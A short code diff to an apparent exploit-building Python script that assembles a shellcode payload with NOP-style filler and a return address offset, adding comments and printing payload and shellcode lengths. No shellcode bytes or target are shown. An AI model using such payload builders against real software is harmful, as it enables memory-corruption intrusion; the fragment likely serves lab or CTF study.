@@ -19,7 +19,10 @@ def build_payload(apply_offset_to_address = False) -> str:
     
     ret = [int.from_bytes(pre_filler_char, endianness)] * shellcode_offset + \
           [int.from_bytes(post_filler_char, endianness)] * (total_length - shellcode_offset)
-    
+
+    # if the address is pointing to the first byte of the payload
+    # this will make the address point to the exact start of the shellcode
+    # thus skipping the nops
     if apply_offset_to_address:
         address = (
             int.from_bytes(address, endianness) - shellcode_offset
@@ -36,4 +39,7 @@ def build_payload(apply_offset_to_address = False) -> str:
         for b in ret
     )
 
-print(f'"{build_payload()}"')
+pl = build_payload()
+print(f'Length: {len(pl) // 4}')
+print(f'Shellcode Length: {len(shellcode)}')
+print(f'Payload: \n"{pl}"')
